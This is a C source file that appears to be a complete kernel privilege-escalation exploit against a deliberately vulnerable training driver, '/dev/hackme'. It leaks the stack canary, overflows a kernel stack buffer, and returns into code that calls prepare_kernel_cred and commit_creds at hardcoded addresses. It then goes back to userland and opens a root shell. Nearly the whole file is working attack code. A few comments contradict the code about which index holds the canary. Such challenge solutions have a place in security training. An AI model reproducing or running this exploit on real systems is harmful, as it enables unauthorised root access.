#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>


int global_fd;

void open_dev(){
    global_fd = open("/dev/hackme", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void print_leak(unsigned long *leak, unsigned n) {
    for (unsigned i = 0; i < n; ++i) {
        printf("%u: %lx\n", i, leak[i]);
    }
}

unsigned long canary;

void leak(void){
    unsigned n = 16;
    unsigned long leak[n]; // Unsigned long is 8 bytes on 64-bit. Necessary to contain 8 byte canary
    printf("Size of leak: %lu", sizeof(leak));
    ssize_t r = read(global_fd, leak, sizeof(leak));
    canary = leak[8]; // Vulnbuf is 8*8=64 bytes total, so we need from byte 64-72, index 8.

    /*
    Explanation of vulnbuf indexes. Remember that it is an unsigned long array.
    Each index is 8 bytes and arrays are 0 indexed:
    0 : 0-8 bytes
    1 : 8-16
    2 : 16-24
    3 : 24-32
    4 : 32-40
    5 : 40-48
    6 : 48-56
    7 : 56-64
    8 : Canary

    So if we specify the 4th index on our unsigned long array we should get the bytes 32-40 which should be canary.
    */

    printf("[*] Leaked %zd bytes\n", r);
    //print_leak(leak, n);
    printf("[*] Canary: %lx\n", canary);

    printf("[*] Printing 10 indexes of leak:\n");
    print_leak(leak, 10);
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long shell_addr = (unsigned long)get_shell;

void my_jump(void) { // needed because of stack alignment
    __asm__(
        ".intel_syntax noprefix;"
        "mov rax, shell_addr;"
        "push rax;"
        "ret;"
        ".att_syntax;"
    );
}


unsigned long user_rip = (unsigned long)my_jump;

void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov rdi, 0x1;" // process id = 1
        "movabs rax, 0xffffffff81133510;" // find_task_by_vpid
        "call rax;" // call find_task_by_vpid
        "mov rdi, rax;" // mov resulting daemon into rdi
        "movabs rax, 0xffffffff811411f0;" //prepare_kernel_cred
	    "call rax;" // call prepare_kernel_cred
        "mov rdi, rax;" // mov result into rdi
	    "movabs rax, 0xffffffff81140c70;" //commit_creds
	    "call rax;" // call commit_creds
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 8;

    for(int i = 0; i < 8; i++) { 
        payload[i] = i;
    }

    payload[off++] = canary; // This will put canary at payload[9] which is the correct placing.
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (unsigned long)escalate_privs; // ret

    puts("[*] Prepared payload");
    unsigned payload_size = sizeof(payload)/sizeof(unsigned long);
    for(int i = 0; i < payload_size; i++) {
        printf("P Index[%d] = %lx\n", i, payload[i]);
    }
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

int main() {

    save_state();

    open_dev();

    leak();

    overflow();
    
    //puts("[!] Should never be reached");
    puts("[!] End of exploit");

    return 0;
}